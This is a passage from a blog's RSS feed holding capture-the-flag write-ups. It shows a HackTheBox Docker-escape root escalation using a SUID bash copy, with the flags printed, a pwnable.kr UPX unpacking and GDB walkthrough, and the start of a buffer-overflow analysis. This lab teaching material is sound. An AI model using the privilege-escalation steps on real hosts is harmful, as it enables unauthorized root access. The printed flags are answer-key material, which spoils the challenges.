&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; test-file
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 1000 1000 0 Jan 13 16:45 test-file
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Success! As we can access files created by ‘augustus’, we have the potential to gain root access. This can be achieved by copying the /bin/bash binary to /home/augustus inside the host machine, setting its SUID bit and onwership to root in the container, and then executing it in the ‘augustus’ user. This method is likely to grant us root access on the host machine.&lt;/p&gt;

&lt;h2 id=&quot;-getting-root&quot;&gt;&lt;a href=&quot;#solving&quot;&gt;&lt;/a&gt; Getting root&lt;/h2&gt;

&lt;p&gt;Let’s try it out! First, we run:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;augustus@GoodGames:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /bin/bash ./badbash
&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /bin/bash ./badbash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@3a453ab39d3d:/home/augustus# &lt;span class=&quot;nb&quot;&gt;chown &lt;/span&gt;root:root badbash
&lt;span class=&quot;nb&quot;&gt;chown &lt;/span&gt;root:root badbash
root@3a453ab39d3d:/home/augustus# &lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;4777 badbash
&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;4777 badbash
root@3a453ab39d3d:/home/augustus# &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; badbash
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; badbash
&lt;span class=&quot;nt&quot;&gt;-rwsrwxrwx&lt;/span&gt; 1 root root 1168776 Jan 13 16:48 badbash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, back on the host machine:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;augustus@GoodGames:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; badbash
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; badbash
&lt;span class=&quot;nt&quot;&gt;-rwsrwxrwx&lt;/span&gt; 1 root root 1168776 Jan 13 16:48 badbash
augustus@GoodGames:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./badbash &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
./badbash &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
badbash-5.0# &lt;span class=&quot;nb&quot;&gt;whoami
whoami
&lt;/span&gt;root
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And we get root on the host machine! We can now retrieve the flags:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;badbash-5.0# &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;User flag:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /home/augustus/user.txt&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Root flag:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root.txt
&amp;lt;ustus/user.txt&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Root flag:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root.txt
User flag:
c48d858e747788869b014967d28dd872
Root flag:
bdb613146b47f0a8c563b9fda49567ea
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;&lt;a href=&quot;#conclusions&quot;&gt;&lt;/a&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;This CTF had nice concepts to practice: ranging from SQL injection, to Server Side Template Injection and then 
Docker escape with a privileged container and less privileged host access.&lt;/p&gt;

&lt;p&gt;With the SQL injection, we got the administrator
user on the website. We managed to successfully exploit the Server Side Template Injection (SSTI) vulnerability and gain access to the system’s container. Due to implementation faults, we were able to escalate our privileges by escaping the Docker environment and using both the container and a less privileged user on the host to gain root access. This allowed us to have full control over the system.&lt;/p&gt;

&lt;p&gt;I hope you liked this write-up and learned something new. As always, don’t forget to do your &lt;strong&gt;research!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Sat, 13 Jan 2024 00:00:00 -0300</pubDate>
        <link>http://localhost:4000//goodgames-htb</link>
        <link href="http://localhost:4000/goodgames-htb"/>
        <guid isPermaLink="true">http://localhost:4000/goodgames-htb</guid>
      </item>
    
      <item>
        <title>flag - pwnable.kr</title>
        <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;

&lt;p&gt;Ahoy, brave CTF adventurers! Today we are going to be dropping Pupa’s card by solving the “flag” CTF at &lt;a href=&quot;https://pwnable.kr&quot;&gt;pwnable&lt;/a&gt;.  Without further ado, let’s see what this challenge is about!&lt;/p&gt;

&lt;h1 id=&quot;challenge-description&quot;&gt;&lt;a href=&quot;#level-description&quot;&gt;&lt;/a&gt;Challenge description&lt;/h1&gt;

&lt;p&gt;The challenge description is:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Papa brought me a packed present! let’s open it.&lt;/p&gt;

  &lt;p&gt;Download : &lt;a href=&quot;http://pwnable.kr/bin/flag&quot;&gt;http://pwnable.kr/bin/flag&lt;/a&gt;&lt;/p&gt;

  &lt;p&gt;This is reversing task. all you need is binary&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;This challenge seems to be only a reverse engineering task, without any source code. What to expect from it?&lt;/p&gt;

&lt;h1 id=&quot;approach-mindset&quot;&gt;&lt;a href=&quot;#approach&quot;&gt;&lt;/a&gt;Approach mindset&lt;/h1&gt;

&lt;p&gt;Let’s sharpen up our mindset. Since we don’t have any other information about the challenge, we will need to do a little recon first, by analyzing the binary with GDB. Then, if the flag is inside the binary, we just need to find its address and use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x/1s &amp;lt;address&amp;gt;&lt;/code&gt; to retrieve it in strings format.&lt;/p&gt;

&lt;h2 id=&quot;examining-the-binary&quot;&gt;&lt;a href=&quot;#examining-binary&quot;&gt;&lt;/a&gt;Examining the binary&lt;/h2&gt;
&lt;p&gt;Once we download the binary, we need to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod +x flag&lt;/code&gt;, then we can use GDB to examine it:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gdb ./flag
...
Reading symbols from ./flag...
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;No debugging symbols found &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; ./flag&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ok, that is problematic… We have no symbols, so there is no way we can disassemble it with GDB. Let’s exit and use other tricks to understand why the symbols are missing. We can analyze it with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strings&lt;/code&gt; command:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings flag
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
USQRH
PROT_EXEC|PROT_WRITE failed.
&lt;span class=&quot;nv&quot;&gt;$Info&lt;/span&gt;: This file is packed with the UPX executable packer http://upx.sf.net &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$Id&lt;/span&gt;: UPX 3.08 Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1996-2011 the UPX Team. All Rights Reserved. &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Note that from the huge output we get, this line stands up, showing the file is packed with UPX packer. Alright, this might be the reason why the symbols are missing. Packed files have their symbols stripped, and the only way to read them is by unpacking it.&lt;/p&gt;

&lt;p&gt;After a quick research, we find &lt;a href=&quot;https://linux.die.net/man/1/upx&quot;&gt;this&lt;/a&gt; article about the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;upx&lt;/code&gt; Linux command. This command can be used to unpack executable UPX files, which seems to be our case. We can try using the following command to unpack the file:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;upx &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; flag
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This should unpack the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag&lt;/code&gt; binary and restore the missing symbols. After unpacking, we can analyze the binary again using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt; command to see if the symbols are stripped:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file flag
flag: ELF 64-bit LSB executable, x86-64, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GNU/Linux&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, statically linked, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 2.6.24, BuildID[sha1]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;96ec4cc272aeb383bd9ed26c0d4ac0eb5db41b16, not stripped
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we can see, the file is not stripped and we can read its symbols! With a little help of GDB, we can disassemble the main function:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; disassemble main
Dump of assembler code &lt;span class=&quot;k&quot;&gt;for function &lt;/span&gt;main:
   0x0000000000401164 &amp;lt;+0&amp;gt;:     push   %rbp
   0x0000000000401165 &amp;lt;+1&amp;gt;:     mov    %rsp,%rbp
   0x0000000000401168 &amp;lt;+4&amp;gt;:     sub    &lt;span class=&quot;nv&quot;&gt;$0x10&lt;/span&gt;,%rsp
   0x000000000040116c &amp;lt;+8&amp;gt;:     mov    &lt;span class=&quot;nv&quot;&gt;$0x496658&lt;/span&gt;,%edi
   0x0000000000401171 &amp;lt;+13&amp;gt;:    call   0x402080 &amp;lt;puts&amp;gt;
   0x0000000000401176 &amp;lt;+18&amp;gt;:    mov    &lt;span class=&quot;nv&quot;&gt;$0x64&lt;/span&gt;,%edi
   0x000000000040117b &amp;lt;+23&amp;gt;:    call   0x4099d0 &amp;lt;malloc&amp;gt;
   0x0000000000401180 &amp;lt;+28&amp;gt;:    mov    %rax,-0x8&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%rbp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   0x0000000000401184 &amp;lt;+32&amp;gt;:    mov    0x2c0ee5&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%rip&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%rdx        &lt;span class=&quot;c&quot;&gt;# 0x6c2070 &amp;lt;flag&amp;gt;                                                                       &lt;/span&gt;
   0x000000000040118b &amp;lt;+39&amp;gt;:    mov    &lt;span class=&quot;nt&quot;&gt;-0x8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%rbp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%rax
   0x000000000040118f &amp;lt;+43&amp;gt;:    mov    %rdx,%rsi
   0x0000000000401192 &amp;lt;+46&amp;gt;:    mov    %rax,%rdi
   0x0000000000401195 &amp;lt;+49&amp;gt;:    call   0x400320
   0x000000000040119a &amp;lt;+54&amp;gt;:    mov    &lt;span class=&quot;nv&quot;&gt;$0x0&lt;/span&gt;,%eax
   0x000000000040119f &amp;lt;+59&amp;gt;:    leave
   0x00000000004011a0 &amp;lt;+60&amp;gt;:    ret
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Aha! As we can see, there is an address which the flag is stored: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x6c2070&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;solving&quot;&gt;&lt;a href=&quot;#solving&quot;&gt;&lt;/a&gt;Solving!&lt;/h2&gt;

&lt;p&gt;Now we can just use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x/1s *0x6c2070&lt;/code&gt; to see the contents allocated in this address:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; x/1s &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;0x6c2070
0x496628:       &lt;span class=&quot;s2&quot;&gt;&quot;UPX...? sounds like a delivery service :)&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And there is our flag (:&lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;&lt;a href=&quot;#conclusions&quot;&gt;&lt;/a&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;This was a very simple CTF challenge. By unpacking the packed binary file using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;upx&lt;/code&gt; command, we were able to restore the missing symbols and read them with GDB. After analyzing the binary, we discovered the address where the flag was stored and used &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x/1s&lt;/code&gt; command to retrieve the flag: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UPX...? sounds like a delivery service :)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Enjoy your Pupa card! I heard it gives 400 base HP, so it’s very good for super novice class!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/pupa.png&quot; alg=&quot;pupa card&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I hope you liked this write-up and learned something new. As always, don’t forget to do your &lt;strong&gt;research!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Mon, 08 Jan 2024 00:00:00 -0300</pubDate>
        <link>http://localhost:4000//flag-pwnable</link>
        <link href="http://localhost:4000/flag-pwnable"/>
        <guid isPermaLink="true">http://localhost:4000/flag-pwnable</guid>
      </item>
    
      <item>
        <title>bof - pwnable.kr</title>
        <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;

&lt;p&gt;Let’s go back to &lt;a href=&quot;https://pwnable.kr&quot;&gt;Pwnable&lt;/a&gt; and continue our journey collecting monster cards. Today, we are getting Smokie’s card. Let’s take a look at it!&lt;/p&gt;

&lt;h1 id=&quot;challenge-description&quot;&gt;&lt;a href=&quot;#level-description&quot;&gt;&lt;/a&gt;Challenge description&lt;/h1&gt;

&lt;p&gt;The challenge description is:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Nana told me that buffer overflow is one of the most common software vulnerability. 
Is that true?&lt;/p&gt;

  &lt;p&gt;Download : http://pwnable.kr/bin/bof
Download : http://pwnable.kr/bin/bof.c&lt;/p&gt;

  &lt;p&gt;Running at : nc pwnable.kr 9000&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I’m not sure if that is true, but it surely happens!&lt;/p&gt;

&lt;h1 id=&quot;approach-mindset&quot;&gt;&lt;a href=&quot;#approach&quot;&gt;&lt;/a&gt;Approach mindset&lt;/h1&gt;

&lt;p&gt;Let’s change our approach mindset a bit for these kind of attacks:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Code review&lt;/li&gt;
  &lt;li&gt;Analyzing the binary&lt;/li&gt;
  &lt;li&gt;Crafting the attack&lt;/li&gt;
  &lt;li&gt;Solving&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;step-1---code-review&quot;&gt;&lt;a href=&quot;#mindset-step0&quot;&gt;&lt;/a&gt;Step 1 - Code review&lt;/h2&gt;

&lt;p&gt;Once we download the files from Pwnable, let’s take a look at the challenge source code:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;overflowme&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;overflow me : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;overflowme&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;       &lt;span class=&quot;c1&quot;&gt;// smash me!&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xcafebabe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Nah..&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]){&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xdeadbeef&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s dissect this code.&lt;/p&gt;

&lt;h3 id=&quot;func-function&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;func&lt;/code&gt; function&lt;/h3&gt;

&lt;p&gt;This function takes an integer as argument under the name of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;key&lt;/code&gt;. After that, it initializes a buffer variable called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;overflowme&lt;/code&gt; with 32 bytes size allocation. It uses the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gets()&lt;/code&gt; method to get user input. This method is known for having security issues regarding buffer overflow. Nowadays, this function has become obsolete because of its danger. You can understand it more &lt;a href=&quot;https://stackoverflow.com/questions/1694036/why-is-the-gets-function-so-dangerous-that-it-should-not-be-used&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Right after the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gets()&lt;/code&gt; line, we have an if statement that compares our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;key&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xcafebabe&lt;/code&gt;. If that holds, we spawn a shell. If not, then it just prints “Nah…”.&lt;/p&gt;

&lt;h3 id=&quot;main-function&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt; function&lt;/h3&gt;

&lt;p&gt;This function starts the code by calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;func&lt;/code&gt;, passing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;key&lt;/code&gt; argument as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt;. This indicates that, from the code’s flow, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;key&lt;/code&gt; will never be equal &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xcafebabe&lt;/code&gt;, unless we overflow it!&lt;/p&gt;

&lt;h2 id=&quot;step-2---analyzing-the-binary&quot;&gt;&lt;a href=&quot;#mindset-step2&quot;&gt;&lt;/a&gt;Step 2 - Analyzing the binary&lt;/h2&gt;

&lt;p&gt;Now that we understand how the code works, let’s use GDB to analyze the binary and discover how we can overflow the stack, making the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;key&lt;/code&gt; variable equals &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xcafebabe&lt;/code&gt;. Starting GDB with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gdb ./bof&lt;/code&gt;, the first thing we should do is to add a breakpoint at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;func&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; b func
Breakpoint 1 at 0x632
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; r
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The idea here is to disassemble the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;func&lt;/code&gt; method to grab the memory address of the if statement:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/bof1.png&quot; alt=&quot;func breakpoint disassemble&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, the last line of the image above has &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmpl&lt;/code&gt; instruction, which is used to compare two things. It is comparing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xcafebabe&lt;/code&gt; with the value in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%ebp&lt;/code&gt;. Let’s add a break point exactly there:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; b &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;0x56555654
Breakpoint 2 at 0x56555654
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; c
Continuing.
overflow me : 
AAAAAAAAAAAAA
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We pass a small input to check the stack right afterwards. Note that our input starts showing on the stack on the top-right corner of the image below, whereas the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt; address on the bottom-left corner, which is the value stored on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;key&lt;/code&gt; variable.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/bof2.png&quot; alt=&quot;stack&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Every 4 A’s in a row produces a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x41&lt;/code&gt;. This means we need to count how many addresses appear between our first &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x41414141&lt;/code&gt; until the very last one before &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt;. There are 13 of them, and since at each address we have 4 bytes, we need to multiply 13 by 4, which is 52. This is the size of our overflow string in order to overwrite the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;key&lt;/code&gt; variable:&lt;/p&gt;

